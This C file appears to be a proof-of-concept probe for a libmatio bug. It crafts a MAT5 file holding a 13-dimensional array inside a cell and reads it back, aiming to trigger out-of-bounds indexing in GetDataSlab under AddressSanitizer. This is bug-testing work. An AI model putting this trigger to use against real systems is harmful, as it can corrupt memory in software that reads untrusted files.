/* Proof-of-concept probe for a delocalized memory-safety defect in libmatio.
 *
 * Drives only the public API: a crafted MAT5 file is produced with the
 * library's own writer (a compressed cell array whose single element is a
 * high-rank numeric array) and then read back.  Reading the element's data
 * through Mat_VarReadData() with an in-contract hyperslab selection reaches
 * GetDataSlab()'s rank-N copy, where the fixed-size index arrays are indexed
 * with the file-controlled rank.
 *
 * Returns 0 if the library handled everything cleanly (no defect reachable);
 * an AddressSanitizer abort inside libmatio signals the defect on the
 * resulting tree.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "matio.h"

#define RANK 13

int
main(void)
{
    const char *path = "/tmp/poc_matio_slab.mat";
    size_t dims[RANK];
    double values[4];
    int i;

    for ( i = 0; i < RANK; i++ )
        dims[i] = 1;
    /* nelems = 4 so the compressed element stays small enough to be cached in
     * memory on read (the in-memory slab path); dims otherwise in contract. */
    dims[0] = 2;
    dims[1] = 2;
    for ( i = 0; i < 4; i++ )
        values[i] = (double)i;

    /* Build: cell{1,1} = <RANK-dimensional double array> */
    {
        mat_t *mat;
        matvar_t *inner, *cell;
        size_t cell_dims[2] = {1, 1};
        matvar_t *cell_data[1];

        inner = Mat_VarCreate("inner", MAT_C_DOUBLE, MAT_T_DOUBLE, RANK, dims, values, 0);
        if ( NULL == inner )
            return 2;

        cell = Mat_VarCreate("c", MAT_C_CELL, MAT_T_CELL, 2, cell_dims, NULL, 0);
        if ( NULL == cell ) {
            Mat_VarFree(inner);
            return 2;
        }
        cell_data[0] = inner;
        Mat_VarSetCell(cell, 0, inner);

        mat = Mat_CreateVer(path, NULL, MAT_FT_MAT5);
        if ( NULL == mat ) {
            Mat_VarFree(cell);
            return 2;
        }
        if ( Mat_VarWrite(mat, cell, MAT_COMPRESSION_ZLIB) != 0 ) {
            Mat_Close(mat);
            Mat_VarFree(cell);
            return 2;
        }
        Mat_Close(mat);
        Mat_VarFree(cell);
    }

    /* Read back and drive the slab reader through the public API. */
    {
        mat_t *mat;
        matvar_t *cell, *element;
        int start[RANK], stride[RANK], edge[RANK];
        double out[4];

        mat = Mat_Open(path, MAT_ACC_RDONLY);
        if ( NULL == mat )
            return 2;

        cell = Mat_VarReadNextInfo(mat);
        if ( NULL == cell || cell->class_type != MAT_C_CELL || NULL == cell->data ) {
            if ( cell )
                Mat_VarFree(cell);
            Mat_Close(mat);
            return 2;
        }

        element = ((matvar_t **)cell->data)[0];
        if ( NULL == element ) {
            Mat_VarFree(cell);
            Mat_Close(mat);
            return 2;
        }

        for ( i = 0; i < RANK; i++ ) {
            start[i] = 0;
            stride[i] = 1;
            edge[i] = (int)element->dims[i]; /* full, in-contract selection */
        }

        memset(out, 0, sizeof(out));
        (void)Mat_VarReadData(mat, element, out, start, stride, edge);

        Mat_VarFree(cell);
        Mat_Close(mat);
    }

    printf("probe completed without sanitizer abort\n");
    return 0;
}
